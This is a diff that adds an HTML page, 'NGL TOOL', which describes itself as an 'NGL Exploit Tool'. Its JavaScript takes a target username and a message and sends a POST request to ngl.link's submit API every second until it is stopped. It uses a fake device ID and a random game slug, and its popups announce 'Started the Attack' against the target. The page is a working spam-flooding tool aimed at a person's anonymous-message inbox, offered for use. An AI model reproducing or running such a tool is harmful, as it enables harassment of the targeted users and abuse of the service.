@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600&display=swap" rel="stylesheet" />
+    <style>
+      body {
+  margin: 0;
+  background-color: black;
+  color: white;
+  font-family: "Rajdhani";
+  height: 100vh;
+  
+}
+
+.popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: black;
+    border: 1px solid #6b2eff;
+    color: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    z-index: 1000;
+    width: 300px;
+    text-align: center;
+}
+
+.popup .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 20px;
+    cursor: pointer;
+}
+.input-container{
+  
+  text-align: center;
+}
+.input-card{
+  border: #ffffff;
+  
+  border: 1px solid rgba(255, 255, 255, 0.25);
+  display: inline-block; 
+            border-radius: 40px;
+            margin:10px;
+}
+.button-container{
+  margin-bottom: 100px;
+    
+    text-align: center;
+    
+}
+.button-container button{
+  display: inline-block;
+  width: 100px; /* Fixed width */
+margin: 10px;
+  
+}
+        #startButton {
+          background-color: #6b2eff; /* Button background color */
+          padding: 14px 20px;
+  text-decoration: none;
+  font-family: "Rajdhani";
+  color: white;
+  outline: none;
+  border: none;
+        }
+                #stopButton {
+          background-color: #6b2eff; /* Button background color */
+          padding: 14px 20px;
+  text-decoration: none;
+  font-family: "Rajdhani";
+  color: white;
+  outline: none;
+  border: none;
+        }
+        
+.input-card input[type="text"] {
+            
+            padding: 20px;
+            font-size: 16px;
+            border: none;
+            outline: none;
+            background: transparent;
+            color:white;
+        }
+        
+.center-container {
+  margin-top: 25vh;
+  
+    text-align: center;
+    margin-bottom: 50px;
+}
+
+    .popup-label .popupUsername .popupMessage{
+      font-size: 18px;
+    }
+    .popup-title {
+      font-size: 30px;
+      font-weight: 500;
+    }
+.text-container {
+  
+  font-size: 40px;
+      font-weight: 500;
+}
+.typing-animation {
+  font-size: 24px;
+  margin: 0 ;
+  
+}
+
+.typing-animation:after {
+        content: "|";
+        
+        opacity: 1;
+        animation: blink 2s infinite;
+        color: #6b2eff;
+        
+}
+@keyframes blink {
+        0%,100% {
+                opacity: 1;
+        }
+
+        50% {
+                opacity: 0;
+        }
+}
+
+    .footer-container{
+      text-align: center;
+      
+      margin: 50px;
+      
+    }
+    .footer {
+      font-size: 24px;
+    }
+    
+@media screen and (max-width: 1200px) {
+    .typing-animation {
+    font-size: 18px;
+    }
+    .text-container{
+      font-size: 30px;
+    }
+    .popup-label .popupUsername .popupMessage{
+      font-size: 18px;
+    }
+    .popup-title {
+      font-size: 30px;
+    }
+
+    .footer {
+      
+      
+      font-size: 18px;
+      
+    }
+    .footer-container{
+      margin: 20px;
+    }
+    </style>
+    <meta name="theme-color" content="#000000">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-nvt0huJrY11TqCzydZL7YmS5P2q+WPOm3/HCqyNE0FT/DAN7Ff1VYy+/vp1g7LAV+1ml+/2kY1/mRN/N42qrvQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    <title>NGL TOOL</title>
+</head>
+<body>
+
+    <div class="center-container">
+             <div class="text-container" >NGL TOOL</div>
+             <div class="typing-animation" data-text="NGL Exploit Tool by saynt "></div>
+             
+    </div>
+    <div class="input-container">
+        <div class="input-card">
+            <input type="text" id="username" placeholder="Username">
+        </div>
+        <div class="input-card">
+            <input type="text" id="question" placeholder="Message">
+        </div>
+    </div>
+    <div class="button-container">
+        <button id="startButton" onclick="startProcess()">START</button>
+        <button id="stopButton" onclick="stopProcess()">STOP</button>
+    </div>
+    
+        <footer>
+    <div class="footer-container">
+
+            <div class="footer">© saynt</div>
+    </div>
+        </footer>
+<div id="attackPopup" class="popup" style="display: none;">
+    <span class="close-btn" onclick="closePopup()">×</span>
+    <div class="popup-title">Started the Attack</div><br>
+    <class="popup-label">Target username: <span id="popupUsername" class="popup-username"></span><br>
+    <class="popup-label">Message: <span id="popupMessage" class="popup-message"></span>
+</div>
+    
+            <div id="closePopup" class="popup" style="display: none;">
+        <span class="close-btn" onclick="closePopup2()">×</span>
+    <div class="popup-title">Stopped the Attack</div>
+    </div>
+    
+    <script src="https://unpkg.com/scrollreveal@4.0.9/dist/scrollreveal.min.js"></script>
+    <script>
+      
+      function typeWrite(elemento) {
+  const textoArray = elemento.getAttribute('data-text').split(""); 
+  elemento.innerHTML = ""; 
+
+  textoArray.forEach(function (letra, i) {
+    setTimeout(function () {
+      elemento.innerHTML += letra;
+    }, 40 * i);
+  });
+}
+
+
+document.addEventListener("DOMContentLoaded", function () {
+  setTimeout(() => {
+    const typingElement = document.querySelector('.typing-animation');
+    typeWrite(typingElement);
+  }, 1500);
+});
+
+var activeRequests = [];
+var isProcessRunning = false;
+
+var availableGames = ['', 'confessions', '3words', 'wfriendship', 'rizzme', 'tbh', 'shipme', 'yourcrush', 'cancelled', 'dealbreaker'];
+
+var selectedGame = availableGames[Math.floor(Math.random() * availableGames.length)];
+
+function generateUniqueDeviceId() {
+    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+}
+
+var uniqueDeviceId = generateUniqueDeviceId();
+
+function startProcess() {
+    if (isProcessRunning) {
+        return;
+    }
+    var userNameInput = document.getElementById("username").value;
+    var userQuestionInput = document.getElementById("question").value;
+    
+        document.getElementById("popupUsername").textContent = userNameInput;
+    document.getElementById("popupMessage").textContent = userQuestionInput;
+    document.getElementById("attackPopup").style.display = "block";
+
+    
+
+    document.getElementById("startButton").classList.add("clicked");
+    document.getElementById("stopButton").classList.remove("clicked");
+
+    isProcessRunning = true;
+    var requestIntervalId = setInterval(function() {
+        var xhrRequest = new XMLHttpRequest();
+        var apiUrl = "https://ngl.link/api/submit";
+        xhrRequest.open("POST", apiUrl, true);
+        xhrRequest.setRequestHeader("Accept", "*/*");
+        xhrRequest.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
+        xhrRequest.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        xhrRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+        xhrRequest.setRequestHeader("Host", "ngl.link");
+        xhrRequest.setRequestHeader("Origin", "https://ngl.link");
+
+        var requestData = "username=" + userNameInput + "&question=" + userQuestionInput + "&deviceId=" + uniqueDeviceId + "&gameSlug=" + selectedGame + "";
+        
+        xhrRequest.send(requestData);
+
+        activeRequests.push(xhrRequest);
+
+    }, 1000);
+
+    activeRequests.push(requestIntervalId);
+}
+
+function stopProcess() {
+    document.getElementById("stopButton").classList.add("clicked");
+    document.getElementById("startButton").classList.remove("clicked");
+    document.getElementById("closePopup").style.display = "block";
+    for (var i = 0; i < activeRequests.length; i++) {
+        clearInterval(activeRequests[i]);
+        if (activeRequests[i] instanceof XMLHttpRequest) {
+            activeRequests[i].abort();
+        }
+    }
+
+    activeRequests = [];
+    isProcessRunning = false;
+}
+
+function closePopup() {
+    document.getElementById("attackPopup").style.display = "none";
+}
+function closePopup2() {
+    document.getElementById("closePopup").style.display = "none";
+}
+
+
+
+    </script>
+    
+</body>
+</html>
